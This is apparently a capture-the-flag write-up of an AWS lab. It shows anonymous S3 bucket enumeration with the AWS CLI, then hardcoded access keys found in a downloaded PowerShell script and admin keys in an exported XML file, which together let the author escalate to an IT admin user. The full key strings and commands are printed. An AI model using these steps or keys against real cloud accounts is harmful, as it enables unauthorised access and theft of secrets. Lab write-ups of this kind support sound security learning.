Hello pwners! This is my first writeup in the world of cloud penetration testing specifically AWS. My goal is to consolidate the knowledge I gained from this lab and to share that knowledge with others

The goal of this lab is to teach us the initial phase of AWS penetration testing which is the enumeration with a focus on S3 enumeration. If you are unfamiliar with S3, you should learn the fundamentals of AWS before proceeding.

The site starts by providing a web link, and the visible URL indicates that it is hosted on AWS.

The site begins by providing a link to a webpage that, upon opening, appears to be a completely ordinary webpage.

![[Pasted image 20260916160939.png]]

So, let's take a look at the page's source code.

![[Pasted image 20260916161102.png]]

```html
<meta charset="UTF-8">
<title>Huge Logistics</title>
<link rel="stylesheet" href="https://s3.amazonaws.com/dev.huge-logistics.com/static/">
```

Interestingly, it now appears to be using an S3 bucket named `dev.huge-logistics.com` to store static files.

When I tried to play with that URL in the browser, I didn't find anything useful; everything just resulted in "access denied messages."

![[Pasted image 20260916162414.png]]

So let's try using AWS CLI

```shell
sudo apt install awscli
```

After installing it, come with me and let's see what we can do with it

```shell
aws s3 ls s3://dev.huge-logistics.com --no-sign-request
```

Let's break it down:

aws: is the tool name s3: is the name of the service that we want to interact with ls: is the action that we want to do (here we are listing the contents) --no-sign-request: means that the request is anonymous (think of it like the FTP anonymous login)

![[Pasted image 20260916163748.png]]

Here we go! My request succeeded, returning a list of the contents.

We can now explore each one.

```shell
aws s3 ls s3://dev.huge-logistics.com/admin/ --no-sign-request
aws s3 ls s3://dev.huge-logistics.com/migration-files/ --no-sign-request
aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
```

Actually, I am permitted to see the content of the `/shared` folder only using the anonymous login.

![[Pasted image 20260916164503.png]]

It has one zip file called `hi_migration_project.zip`. So let's get it on my machine:

```shell
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
```

Here we replaced `ls` with `cp` and you can observe its role.

After unzipping the file, we see a PowerShell script.

![[Pasted image 20260916165450.png]]

Let's see what it hides:

```powershell
# AWS Configuration

$accessKey = "AKIA3SFMDAPOWMWJSZZZ"

$secretKey = "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"

$region = "us-east-1"

  

# Set up AWS hardcoded credentials

Set-AWSCredentials -AccessKey $accessKey -SecretKey $secretKey

  

# Set the AWS region

Set-DefaultAWSRegion -Region $region

  

# Read the secrets from export.xml

[xml]$xmlContent = Get-Content -Path "export.xml"

  

# Output log file

$logFile = "upload_log.txt"

  

# Error handling with retry logic

function TryUploadSecret($secretName, $secretValue) {

$retries = 3

while ($retries -gt 0) {

try {

$result = New-SECSecret -Name $secretName -SecretString $secretValue

$logEntry = "Successfully uploaded secret: $secretName with ARN: $($result.ARN)"

Write-Output $logEntry

Add-Content -Path $logFile -Value $logEntry

return $true

} catch {

$retries--

Write-Error "Failed attempt to upload secret: $secretName. Retries left: $retries. Error: $_"

}

}

return $false

}

  

foreach ($secretNode in $xmlContent.Secrets.Secret) {

# Implementing concurrency using jobs

Start-Job -ScriptBlock {

param($secretName, $secretValue)

TryUploadSecret -secretName $secretName -secretValue $secretValue

} -ArgumentList $secretNode.Name, $secretNode.Value

}

  

# Wait for all jobs to finish

$jobs = Get-Job

$jobs | Wait-Job

  

# Retrieve and display job results

$jobs | ForEach-Object {

$result = Receive-Job -Job $_

if (-not $result) {

Write-Error "Failed to upload secret: $($_.Name) after multiple retries."

}

# Clean up the job

Remove-Job -Job $_

}

  

Write-Output "Batch upload complete!"

  
  

# Install-Module -Name AWSPowerShell -Scope CurrentUser -Force

# .\migrate_secrets.ps1
```

Wow! The script contains hardcoded AWS keys.

```powershell
# AWS Configuration

$accessKey = "AKIA3SFMDAPOWMWJSZZZ"

$secretKey = "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"

$region = "us-east-1"

```

You can consider the `accessKey` as a `username` and the `secretKey` as a `password`.

Now let's configure the AWS CLI to use these credentials instead of an anonymous connection.

![[Pasted image 20260916182616.png]] ``

Now the AWS CLI has credentials.

```bash
aws sts get-caller-identity
```

This is like `whoami`; it allows us to find out our execution context.

![[Pasted image 20260916183016.png]]

The IAM user whose credentials we used is named `pam-test`.

Now, let's try listing the contents of the paths that I couldn't see using the anonymous login: `/admin`, `/migration-files`.

![[Pasted image 20260916184518.png]]

In the `/admin` directory, I am able to see the content but I can't dump it.

Let's try with `/migration-files`.

![[Pasted image 20260916184740.png]]

```plain
2023-10-16 18:08:47          0 
2023-10-16 18:09:26    1833646 AWS Secrets Manager Migration - Discovery & Design.pdf
2023-10-16 18:09:25    1407180 AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 18:09:27       1853 migrate_secrets.ps1
2026-01-30 21:53:58       2494 test-export.xml

```

In the `migration-files` directory, I am able to see and download the files.

Let's take a look at `test-export.xml`:

```bash
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml .
```

![[Pasted image 20260916185516.png]]

```xml
<CredentialEntry>

<ServiceType>AWS IT Admin</ServiceType>

<AccountID>794929857501</AccountID>

<AccessKeyID>AKIA3SFMDAPO6DGDLJAG</AccessKeyID>

<SecretAccessKey>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</SecretAccessKey>

<Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>

</CredentialEntry>

```

Wow again!

It seems that we now have the `AWS IT Admin` credentials.

Now let's use `aws configure` again to set the new keys.

![[Pasted image 20260916190009.png]]

and `aws sts get-caller-identity` reveals that we are the IAM user `it-admin` 

![[Pasted image 20260916190134.png]]

Let's now try to get the flag!

![[Pasted image 20260916190302.png]]

Yep, and here we go! I could retrieve the flag.

And that's a wrap, pwners!, one misconfigured bucket was all it took to go from anonymous to IT Admin. Stay curious, keep enumerating!
